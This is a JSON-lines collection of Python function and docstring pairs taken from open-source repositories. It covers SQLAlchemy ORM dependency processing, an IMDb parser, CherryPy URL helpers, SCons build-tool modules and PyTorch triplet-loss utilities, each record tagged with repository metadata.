{"docstring": "# head object is being deleted, and we manage its list of \n# child objects the child objects have to have their foreign \n# key to the parent set to NULL this phase can be called \n# safely for any cascade but is unnecessary if delete cascade\n# is on.\n\n", "func_signal": "def process_deletes(self, uowcommit, states):\n", "code": "if self.post_update or not self.passive_deletes == 'all':\n    children_added = uowcommit.memo(('children_added', self), set)\n\n    for state in states:\n        history = uowcommit.get_attribute_history(\n                                    state, \n                                    self.key, \n                                    passive=self.passive_deletes)\n        if history:\n            for child in history.deleted:\n                if child is not None and \\\n                    self.hasparent(child) is False:\n                    self._synchronize(\n                                    state, \n                                    child, \n                                    None, True, \n                                    uowcommit, False)\n                    if self.post_update and child:\n                        self._post_update(child, uowcommit, [state])\n                        \n            if self.post_update or not self.cascade.delete:\n                for child in set(history.unchanged).\\\n                                    difference(children_added):\n                    if child is not None:\n                        self._synchronize(\n                                    state, \n                                    child, \n                                    None, True, \n                                    uowcommit, False)\n                        if self.post_update and child:\n                            self._post_update(child, \n                                                uowcommit, \n                                                [state])\n                            \n            # technically, we can even remove each child from the\n            # collection here too.  but this would be a somewhat \n            # inconsistent behavior since it wouldn't happen \n            #if the old parent wasn't deleted but child was moved.", "path": "library\\sqlalchemy\\orm\\dependency.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"with dxt2_mode on, this field will always use the four color model\"\"\"\n", "func_signal": "def __init__(self, parent, name, dxt2_mode=False, *args, **kwargs):\n", "code": "FieldSet.__init__(self, parent, name, *args, **kwargs)\nself.dxt2_mode = dxt2_mode", "path": "library\\hachoir_parser\\game\\blp.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"establish actions and dependencies related to a flush.\n\nThese actions will operate on all relevant states \nindividually.    This occurs only if there are cycles\nin the 'aggregated' version of events.\n\n\"\"\"\n\n", "func_signal": "def per_state_flush_actions(self, uow, states, isdelete):\n", "code": "parent_base_mapper = self.parent.primary_base_mapper\nchild_base_mapper = self.mapper.primary_base_mapper\nchild_saves = unitofwork.SaveUpdateAll(uow, child_base_mapper)\nchild_deletes = unitofwork.DeleteAll(uow, child_base_mapper)\n\n# locate and disable the aggregate processors\n# for this dependency\n\nif isdelete:\n    before_delete = unitofwork.ProcessAll(uow, self, True, True)\n    before_delete.disabled = True\nelse:\n    after_save = unitofwork.ProcessAll(uow, self, False, True)\n    after_save.disabled = True\n\n# check if the \"child\" side is part of the cycle\n\nif child_saves not in uow.cycles:\n    # based on the current dependencies we use, the saves/\n    # deletes should always be in the 'cycles' collection\n    # together.   if this changes, we will have to break up\n    # this method a bit more.\n    assert child_deletes not in uow.cycles\n    \n    # child side is not part of the cycle, so we will link per-state\n    # actions to the aggregate \"saves\", \"deletes\" actions\n    child_actions = [\n        (child_saves, False), (child_deletes, True)\n    ]\n    child_in_cycles = False\nelse:\n    child_in_cycles = True\n\n# check if the \"parent\" side is part of the cycle\nif not isdelete:\n    parent_saves = unitofwork.SaveUpdateAll(\n                                        uow, \n                                        self.parent.base_mapper)\n    parent_deletes = before_delete = None\n    if parent_saves in uow.cycles:\n        parent_in_cycles = True\nelse:\n    parent_deletes = unitofwork.DeleteAll(\n                                        uow, \n                                        self.parent.base_mapper)\n    parent_saves = after_save = None\n    if parent_deletes in uow.cycles:\n        parent_in_cycles = True\n\n# now create actions /dependencies for each state.\nfor state in states:\n    # detect if there's anything changed or loaded\n    # by a preprocessor on this state/attribute.  if not,\n    # we should be able to skip it entirely.\n    sum_ = uow.get_attribute_history(\n                                    state, \n                                    self.key, \n                                    passive=True).sum()\n    if not sum_:\n        continue\n\n    if isdelete:\n        before_delete = unitofwork.ProcessState(uow, \n                                            self, True, state)\n        if parent_in_cycles:\n            parent_deletes = unitofwork.DeleteState(\n                                        uow, \n                                        state, \n                                        parent_base_mapper)\n    else:\n        after_save = unitofwork.ProcessState(uow, self, False, state)\n        if parent_in_cycles:\n            parent_saves = unitofwork.SaveUpdateState(\n                                        uow, \n                                        state, \n                                        parent_base_mapper)\n        \n    if child_in_cycles:\n        child_actions = []\n        for child_state in sum_:\n            if child_state is None:\n                continue\n            if child_state not in uow.states:\n                child_action = (None, None)\n            else:\n                (deleted, listonly) = uow.states[child_state]\n                if deleted:\n                    child_action = (\n                                    unitofwork.DeleteState(\n                                                uow, child_state, \n                                                child_base_mapper), \n                                    True)\n                else:\n                    child_action = (\n                                    unitofwork.SaveUpdateState(\n                                                uow, child_state, \n                                                child_base_mapper), \n                                    False)\n            child_actions.append(child_action)\n            \n    # establish dependencies between our possibly per-state\n    # parent action and our possibly per-state child action.\n    for child_action, childisdelete in child_actions:\n        self.per_state_dependencies(uow, parent_saves, \n                                        parent_deletes, \n                                        child_action, \n                                        after_save, before_delete, \n                                        isdelete, childisdelete)", "path": "library\\sqlalchemy\\orm\\dependency.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Return a list of Person objects, from the string s; items\nare assumed to be separated by the sep string.\"\"\"\n", "func_signal": "def _getPersons(self, s, sep='<br/>'):\n", "code": "names = s.split(sep)\npl = []\nplappend = pl.append\ncounter = 1\nfor name in names:\n    pid = re_imdbID.findall(name)\n    if not pid: continue\n    characters = _getTagsWith(name, 'class=\"char\"',\n                                toClosure=True, maxRes=1)\n    chpids = []\n    if characters:\n        for ch in characters[0].split(' / '):\n            chid = re_imdbID.findall(ch)\n            if not chid:\n                chpids.append(None)\n            else:\n                chpids.append(chid[-1])\n    if not chpids:\n        chpids = None\n    elif len(chpids) == 1:\n        chpids = chpids[0]\n    name = _unHtml(name)\n    # Catch unclosed tags.\n    gt_indx = name.find('>')\n    if gt_indx != -1:\n        name = name[gt_indx+1:].lstrip()\n    if not name: continue\n    if name.endswith('...'):\n        name = name[:-3]\n    p = build_person(name, personID=str(pid[0]), billingPos=counter,\n                    modFunct=self._defModFunct, roleID=chpids,\n                    accessSystem=self.accessSystem)\n    plappend(p)\n    counter += 1\nreturn pl", "path": "library\\imdb\\parser\\mobile\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "# for passive updates, register objects in the process stage\n# so that we avoid ManyToOneDP's registering the object without\n# the listonly flag in its own preprocess stage (results in UPDATE)\n# statements being emitted\n", "func_signal": "def process_saves(self, uowcommit, states):\n", "code": "assert self.passive_updates\nself._process_key_switches(states, uowcommit)", "path": "library\\sqlalchemy\\orm\\dependency.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"create a two-phase transaction ID.\n\nthis id will be passed to do_begin_twophase(), do_rollback_twophase(),\ndo_commit_twophase().  its format is unspecified.\"\"\"\n\n", "func_signal": "def create_xid(self):\n", "code": "id = random.randint(0, 2 ** 128)\nreturn (0x1234, \"%032x\" % id, \"%032x\" % 9)", "path": "library\\sqlalchemy\\dialects\\oracle\\cx_oracle.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Retrieve an html page and normalize it.\"\"\"\n", "func_signal": "def _mretrieve(self, url, size=-1):\n", "code": "cont = self._retrieve(url, size=size)\nreturn self._clean_html(cont)", "path": "library\\imdb\\parser\\mobile\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Create an absolute URL for the given path.\n\nIf 'path' starts with a slash ('/'), this will return\n    (base + script_name + path + qs).\nIf it does not start with a slash, this returns\n    (base + script_name [+ request.path_info] + path + qs).\n\nIf script_name is None, cherrypy.request will be used\nto find a script_name, if available.\n\nIf base is None, cherrypy.request.base will be used (if available).\nNote that you can use cherrypy.tools.proxy to change this.\n\nFinally, note that this function can be used to obtain an absolute URL\nfor the current request path (minus the querystring) by passing no args.\nIf you call url(qs=cherrypy.request.query_string), you should get the\noriginal browser URL (assuming no internal redirections).\n\nIf relative is None or not provided, request.app.relative_urls will\nbe used (if available, else False). If False, the output will be an\nabsolute URL (including the scheme, host, vhost, and script_name).\nIf True, the output will instead be a URL that is relative to the\ncurrent request path, perhaps including '..' atoms. If relative is\nthe string 'server', the output will instead be a URL that is\nrelative to the server root; i.e., it will start with a slash.\n\"\"\"\n", "func_signal": "def url(path=\"\", qs=\"\", script_name=None, base=None, relative=None):\n", "code": "if isinstance(qs, (tuple, list, dict)):\n    qs = _urlencode(qs)\nif qs:\n    qs = '?' + qs\n\nif request.app:\n    if not path.startswith(\"/\"):\n        # Append/remove trailing slash from path_info as needed\n        # (this is to support mistyped URL's without redirecting;\n        # if you want to redirect, use tools.trailing_slash).\n        pi = request.path_info\n        if request.is_index is True:\n            if not pi.endswith('/'):\n                pi = pi + '/'\n        elif request.is_index is False:\n            if pi.endswith('/') and pi != '/':\n                pi = pi[:-1]\n        \n        if path == \"\":\n            path = pi\n        else:\n            path = _urljoin(pi, path)\n    \n    if script_name is None:\n        script_name = request.script_name\n    if base is None:\n        base = request.base\n    \n    newurl = base + script_name + path + qs\nelse:\n    # No request.app (we're being called outside a request).\n    # We'll have to guess the base from server.* attributes.\n    # This will produce very different results from the above\n    # if you're using vhosts or tools.proxy.\n    if base is None:\n        base = server.base()\n    \n    path = (script_name or \"\") + path\n    newurl = base + path + qs\n\nif './' in newurl:\n    # Normalize the URL by removing ./ and ../\n    atoms = []\n    for atom in newurl.split('/'):\n        if atom == '.':\n            pass\n        elif atom == '..':\n            atoms.pop()\n        else:\n            atoms.append(atom)\n    newurl = '/'.join(atoms)\n\n# At this point, we should have a fully-qualified absolute URL.\n\nif relative is None:\n    relative = getattr(request.app, \"relative_urls\", False)\n\n# See http://www.ietf.org/rfc/rfc2396.txt\nif relative == 'server':\n    # \"A relative reference beginning with a single slash character is\n    # termed an absolute-path reference, as defined by <abs_path>...\"\n    # This is also sometimes called \"server-relative\".\n    newurl = '/' + '/'.join(newurl.split('/', 3)[3:])\nelif relative:\n    # \"A relative reference that does not begin with a scheme name\n    # or a slash character is termed a relative-path reference.\"\n    old = url(relative=False).split('/')[:-1]\n    new = newurl.split('/')\n    while old and new:\n        a, b = old[0], new[0]\n        if a != b:\n            break\n        old.pop(0)\n        new.pop(0)\n    new = (['..'] * len(old)) + new\n    newurl = '/'.join(new)\n\nreturn newurl", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "# head object is being deleted, and we manage its list of \n# child objects the child objects have to have their \n# foreign key to the parent set to NULL\n", "func_signal": "def presort_deletes(self, uowcommit, states):\n", "code": "should_null_fks = not self.cascade.delete and \\\n                    not self.passive_deletes == 'all'\n\nfor state in states:\n    history = uowcommit.get_attribute_history(\n                                    state, \n                                    self.key, \n                                    passive=self.passive_deletes)\n    if history:\n        for child in history.deleted:\n            if child is not None and self.hasparent(child) is False:\n                if self.cascade.delete_orphan:\n                    uowcommit.register_object(child, isdelete=True)\n                else:\n                    uowcommit.register_object(child)\n        \n        if should_null_fks:\n            for child in history.unchanged:\n                if child is not None:\n                    uowcommit.register_object(child)", "path": "library\\sqlalchemy\\orm\\dependency.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Check timeout on all responses. (Internal)\"\"\"\n", "func_signal": "def run(self):\n", "code": "for req, resp in self.servings:\n    resp.check_timeout()", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Given an object or a path to an object, get the object and its name.\"\"\"\n", "func_signal": "def _cherrypy_pydoc_resolve(thing, forceload=0):\n", "code": "if isinstance(thing, _ThreadLocalProxy):\n    thing = getattr(serving, thing.__attrname__)\nreturn _pydoc._builtin_resolve(thing, forceload)", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Return the list of strings from the 's' string which are included\nbetween the 'begins' and 'ends' strings.\"\"\"\n", "func_signal": "def _findBetween(s, begins, ends, beginindx=0, maxRes=None, lres=None):\n", "code": "if lres is None:\n    lres = []\nbi = s.find(begins, beginindx)\nif bi != -1:\n    lbegins = len(begins)\n    if isinstance(ends, (list, tuple)):\n        eset = [s.find(end, bi+lbegins) for end in ends]\n        eset[:] = [x for x in eset if x != -1]\n        if not eset: ei = -1\n        else: ei = min(eset)\n    else:\n        ei = s.find(ends, bi+lbegins)\n    if ei != -1:\n        match = s[bi+lbegins:ei]\n        lres.append(match)\n        if maxRes is not None and len(lres) >= maxRes: return lres\n        _findBetween(s, begins, ends, beginindx=ei, maxRes=maxRes,\n                    lres=lres)\nreturn lres", "path": "library\\imdb\\parser\\mobile\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Log the given message to the app.log or global log as appropriate.\"\"\"\n# Do NOT use try/except here. See http://www.cherrypy.org/ticket/945\n", "func_signal": "def __call__(self, *args, **kwargs):\n", "code": "if hasattr(request, 'app') and hasattr(request.app, 'log'):\n    log = request.app.log\nelse:\n    log = self\nreturn log.error(*args, **kwargs)", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Add a Builder factory function and construction variables for\nCVS to an Environment.\"\"\"\n\n", "func_signal": "def generate(env):\n", "code": "def CVSFactory(repos, module='', env=env):\n    \"\"\" \"\"\"\n    import SCons.Warnings as W\n    W.warn(W.DeprecatedSourceCodeWarning, \"\"\"The CVS() factory is deprecated and there is no replacement.\"\"\")\n    # fail if repos is not an absolute path name?\n    if module != '':\n       # Don't use os.path.join() because the name we fetch might\n       # be across a network and must use POSIX slashes as separators.\n       module = module + '/'\n       env['CVSCOM']   = '$CVS $CVSFLAGS co $CVSCOFLAGS -d ${TARGET.dir} $CVSMODULE${TARGET.posix}'\n    act = SCons.Action.Action('$CVSCOM', '$CVSCOMSTR')\n    return SCons.Builder.Builder(action = act,\n                                 env = env,\n                                 CVSREPOSITORY = repos,\n                                 CVSMODULE = module)\n\n#setattr(env, 'CVS', CVSFactory)\nenv.CVS = CVSFactory\n\nenv['CVS']        = 'cvs'\nenv['CVSFLAGS']   = SCons.Util.CLVar('-d $CVSREPOSITORY')\nenv['CVSCOFLAGS'] = SCons.Util.CLVar('')\nenv['CVSCOM']     = '$CVS $CVSFLAGS co $CVSCOFLAGS ${TARGET.posix}'", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Tool\\CVS.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Handle user warnings. Print out a message and a description of\nthe warning, along with the line number and routine where it occured.\nThe file and line number will be the deepest stack frame that is\nnot part of SCons itself.\n\"\"\"\n", "func_signal": "def _scons_user_warning(e):\n", "code": "etype, value, tb = sys.exc_info()\nfilename, lineno, routine, dummy = find_deepest_user_frame(traceback.extract_tb(tb))\nsys.stderr.write(\"\\nscons: warning: %s\\n\" % e)\nsys.stderr.write('File \"%s\", line %d, in %s\\n' % (filename, lineno, routine))", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "# Handle the failure of a build task.  The primary purpose here\n# is to display the various types of Errors and Exceptions\n# appropriately.\n", "func_signal": "def failed(self):\n", "code": "exc_info = self.exc_info()\ntry:\n    t, e, tb = exc_info\nexcept ValueError:\n    t, e = exc_info\n    tb = None\n\nif t is None:\n    # The Taskmaster didn't record an exception for this Task;\n    # see if the sys module has one.\n    try:\n        t, e, tb = sys.exc_info()[:]\n    except ValueError:\n        t, e = exc_info\n        tb = None\n        \n# Deprecated string exceptions will have their string stored\n# in the first entry of the tuple.\nif e is None:\n    e = t\n\nbuildError = SCons.Errors.convert_to_BuildError(e)\nif not buildError.node:\n    buildError.node = self.node\n\nnode = buildError.node\nif not SCons.Util.is_List(node):\n        node = [ node ]\nnodename = ', '.join(map(str, node))\n\nerrfmt = \"scons: *** [%s] %s\\n\"\nsys.stderr.write(errfmt % (nodename, buildError))\n\nif (buildError.exc_info[2] and buildError.exc_info[1] and \n   not isinstance(\n       buildError.exc_info[1], \n       (EnvironmentError, SCons.Errors.StopError,\n                    SCons.Errors.UserError))):\n    type, value, trace = buildError.exc_info\n    traceback.print_exception(type, value, trace)\nelif tb and print_stacktrace:\n    sys.stderr.write(\"scons: internal stack trace:\\n\")\n    traceback.print_tb(tb, file=sys.stderr)\n\nself.exception = (e, buildError, tb) # type, value, traceback\nself.do_failed(buildError.exitstatus)\n\nself.exc_clear()", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "# A subsidiary function that exists solely to isolate this import\n# so we don't have to pull it in on all platforms, and so that an\n# in-line \"import\" statement in the _main() function below doesn't\n# cause warnings about local names shadowing use of the 'SCons'\n# globl in nest scopes and UnboundLocalErrors and the like in some\n# versions (2.1) of Python.\n", "func_signal": "def fetch_win32_parallel_msg():\n", "code": "import SCons.Platform.win32\nreturn SCons.Platform.win32.parallel_msg", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"\nPublic interface factory function for creating different types\nof Scanners based on the different types of \"functions\" that may\nbe supplied.\n\nTODO:  Deprecate this some day.  We've moved the functionality\ninside the Base class and really don't need this factory function\nany more.  It was, however, used by some of our Tool modules, so\nthe call probably ended up in various people's custom modules\npatterned on SCons code.\n\"\"\"\n", "func_signal": "def Scanner(function, *args, **kw):\n", "code": "if SCons.Util.is_Dict(function):\n    return Selector(function, *args, **kw)\nelse:\n    return Base(function, *args, **kw)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\__init__.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"\nScans a directory for on-disk files and directories therein.\n\nLooking up the entries will add these to the in-memory Node tree\nrepresentation of the file system, so all we have to do is just\nthat and then call the in-memory scanning function.\n\"\"\"\n", "func_signal": "def scan_on_disk(node, env, path=()):\n", "code": "try:\n    flist = node.fs.listdir(node.abspath)\nexcept (IOError, OSError):\n    return []\ne = node.Entry\nfor f in  filter(do_not_scan, flist):\n    # Add ./ to the beginning of the file name so if it begins with a\n    # '#' we don't look it up relative to the top-level directory.\n    e('./' + f)\nreturn scan_in_memory(node, env, path)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\Dir.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Add Builders and construction variables for xlc / Visual Age\nsuite to an Environment.\"\"\"\n", "func_signal": "def generate(env):\n", "code": "path, _cc, _shcc, version = get_xlc(env)\nif path:\n    _cc = os.path.join(path, _cc)\n    _shcc = os.path.join(path, _shcc)\n\ncc.generate(env)\n\nenv['CC'] = _cc\nenv['SHCC'] = _shcc\nenv['CCVERSION'] = version", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Tool\\aixcc.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Handle syntax errors. Print out a message and show where the error\noccurred.\n\"\"\"\n", "func_signal": "def _scons_syntax_error(e):\n", "code": "etype, value, tb = sys.exc_info()\nlines = traceback.format_exception_only(etype, value)\nfor line in lines:\n    sys.stderr.write(line+'\\n')\nsys.exit(2)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Return a prototype Scanner instance for scanning RC source files\"\"\"\n \n", "func_signal": "def RCScan():\n", "code": "res_re= r'^(?:\\s*#\\s*(?:include)|' \\\n        '.*?\\s+(?:ICON|BITMAP|CURSOR|HTML|FONT|MESSAGETABLE|TYPELIB|REGISTRY|D3DFX)' \\\n        '\\s*.*?)' \\\n        '\\s*(<|\"| )([^>\"\\s]+)(?:[>\" ])*$'\nresScanner = SCons.Scanner.ClassicCPP( \"ResourceScanner\",\n                                       \"$RCSUFFIXES\",\n                                       \"CPPPATH\",\n                                       res_re )\n\nreturn resScanner", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\RC.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"\nFind the deepest stack frame that is not part of SCons.\n\nInput is a \"pre-processed\" stack trace in the form\nreturned by traceback.extract_tb() or traceback.extract_stack()\n\"\"\"\n\n", "func_signal": "def find_deepest_user_frame(tb):\n", "code": "tb.reverse()\n\n# find the deepest traceback frame that is not part\n# of SCons:\nfor frame in tb:\n    filename = frame[0]\n    if filename.find(os.sep+'SCons'+os.sep) == -1:\n        return frame\nreturn tb[0]", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Add a Builder factory function and construction variables for\nSCCS to an Environment.\"\"\"\n\n", "func_signal": "def generate(env):\n", "code": "def SCCSFactory(env=env):\n    \"\"\" \"\"\"\n    import SCons.Warnings as W\n    W.warn(W.DeprecatedSourceCodeWarning, \"\"\"The SCCS() factory is deprecated and there is no replacement.\"\"\")\n    act = SCons.Action.Action('$SCCSCOM', '$SCCSCOMSTR')\n    return SCons.Builder.Builder(action = act, env = env)\n\n#setattr(env, 'SCCS', SCCSFactory)\nenv.SCCS = SCCSFactory\n\nenv['SCCS']         = 'sccs'\nenv['SCCSFLAGS']    = SCons.Util.CLVar('')\nenv['SCCSGETFLAGS'] = SCons.Util.CLVar('')\nenv['SCCSCOM']      = '$SCCS $SCCSFLAGS get $SCCSGETFLAGS $TARGET'", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Tool\\SCCS.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Randomize the dependencies.\"\"\"\n", "func_signal": "def order(dependencies):\n", "code": "import random\n# This is cribbed from the implementation of\n# random.shuffle() in Python 2.X.\nd = dependencies\nfor i in range(len(d)-1, 0, -1):\n    j = int(random.random() * (i+1))\n    d[i], d[j] = d[j], d[i]\nreturn d", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Return a prototype Scanner instance for scanning D source files\"\"\"\n", "func_signal": "def DScanner():\n", "code": "ds = D()\nreturn ds", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\D.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Return a prototype Scanner instance for \"scanning\"\ndirectory Nodes for their in-memory entries\"\"\"\n", "func_signal": "def DirEntryScanner(**kw):\n", "code": "kw['node_factory'] = SCons.Node.FS.Entry\nkw['recursive'] = None\nreturn SCons.Scanner.Base(scan_in_memory, \"DirEntryScanner\", **kw)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\Dir.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Make a task ready for execution\"\"\"\n", "func_signal": "def make_ready(self):\n", "code": "SCons.Taskmaster.OutOfDateTask.make_ready(self)\nif self.out_of_date and self.options.debug_explain:\n    explanation = self.out_of_date[0].explain()\n    if explanation:\n        sys.stdout.write(\"scons: \" + explanation)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Handle user errors. Print out a message and a description of the\nerror, along with the line number and routine where it occured. \nThe file and line number will be the deepest stack frame that is\nnot part of SCons itself.\n\"\"\"\n", "func_signal": "def _scons_user_error(e):\n", "code": "global print_stacktrace\netype, value, tb = sys.exc_info()\nif print_stacktrace:\n    traceback.print_exception(etype, value, tb)\nfilename, lineno, routine, dummy = find_deepest_user_frame(traceback.extract_tb(tb))\nsys.stderr.write(\"\\nscons: *** %s\\n\" % value)\nsys.stderr.write('File \"%s\", line %d, in %s\\n' % (filename, lineno, routine))\nsys.exit(2)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"\n\"Scans\" a Node.FS.Dir for its in-memory entries.\n\"\"\"\n", "func_signal": "def scan_in_memory(node, env, path=()):\n", "code": "try:\n    entries = node.entries\nexcept AttributeError:\n    # It's not a Node.FS.Dir (or doesn't look enough like one for\n    # our purposes), which can happen if a target list containing\n    # mixed Node types (Dirs and Files, for example) has a Dir as\n    # the first entry.\n    return []\nentry_list = sorted(filter(do_not_scan, list(entries.keys())))\nreturn [entries[n] for n in entry_list]", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\Dir.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Slightly different from _scons_user_warning in that we use the\n*current call stack* rather than sys.exc_info() to get our stack trace.\nThis is used by the warnings framework to print warnings.\"\"\"\n", "func_signal": "def _scons_internal_warning(e):\n", "code": "filename, lineno, routine, dummy = find_deepest_user_frame(traceback.extract_stack())\nsys.stderr.write(\"\\nscons: warning: %s\\n\" % e.args[0])\nsys.stderr.write('File \"%s\", line %d, in %s\\n' % (filename, lineno, routine))", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Script\\Main.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"\nThis method scans a single object. 'node' is the node\nthat will be passed to the scanner function, and 'env' is the\nenvironment that will be passed to the scanner function. A list of\ndirect dependency nodes for the specified node will be returned.\n\"\"\"\n", "func_signal": "def __call__(self, node, env, path = ()):\n", "code": "if self.scan_check and not self.scan_check(node, env):\n    return []\n\nself = self.select(node)\n\nif not self.argument is _null:\n    list = self.function(node, env, path, self.argument)\nelse:\n    list = self.function(node, env, path)\n\nkw = {}\nif hasattr(node, 'dir'):\n    kw['directory'] = node.dir\nnode_factory = env.get_factory(self.node_factory)\nnodes = []\nfor l in list:\n    if self.node_class and not isinstance(l, self.node_class):\n        l = node_factory(l, **kw)\n    nodes.append(l)\nreturn nodes", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\__init__.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Return a prototype Scanner instance for scanning\ndirectories for on-disk files\"\"\"\n", "func_signal": "def DirScanner(**kw):\n", "code": "kw['node_factory'] = SCons.Node.FS.Entry\nkw['recursive'] = only_dirs\nreturn SCons.Scanner.Base(scan_on_disk, \"DirScanner\", **kw)", "path": "couchjs\\scons\\scons-local-2.0.1\\SCons\\Scanner\\Dir.py", "repo_name": "cloudant/bigcouch", "stars": 571, "license": "apache-2.0", "language": "python", "size": 10064}
{"docstring": "\"\"\"Normalizing to unit length along the specified dimension.\nArgs:\n  x: pytorch Variable\nReturns:\n  x: pytorch Variable, same shape as input\n\"\"\"\n", "func_signal": "def normalize(x, axis=-1):\n", "code": "x = 1. * x / (torch.norm(x, 2, axis, keepdim=True).expand_as(x) + 1e-12)\nreturn x", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Parallel version.\nArgs:\n  dist_mat: pytorch Variable, available shape:\n    1) [m, n]\n    2) [m, n, N], N is batch size\n    3) [m, n, *], * can be arbitrary additional dimensions\nReturns:\n  dist: three cases corresponding to `dist_mat`:\n    1) scalar\n    2) pytorch Variable, with shape [N]\n    3) pytorch Variable, with shape [*]\n\"\"\"\n", "func_signal": "def shortest_dist(dist_mat):\n", "code": "m, n = dist_mat.size()[:2]\n# Just offering some reference for accessing intermediate distance.\ndist = [[0 for _ in range(n)] for _ in range(m)]\nfor i in range(m):\n  for j in range(n):\n    if (i == 0) and (j == 0):\n      dist[i][j] = dist_mat[i, j]\n    elif (i == 0) and (j > 0):\n      dist[i][j] = dist[i][j - 1] + dist_mat[i, j]\n    elif (i > 0) and (j == 0):\n      dist[i][j] = dist[i - 1][j] + dist_mat[i, j]\n    else:\n      dist[i][j] = torch.min(dist[i - 1][j], dist[i][j - 1]) + dist_mat[i, j]\ndist = dist[-1][-1]\nreturn dist", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
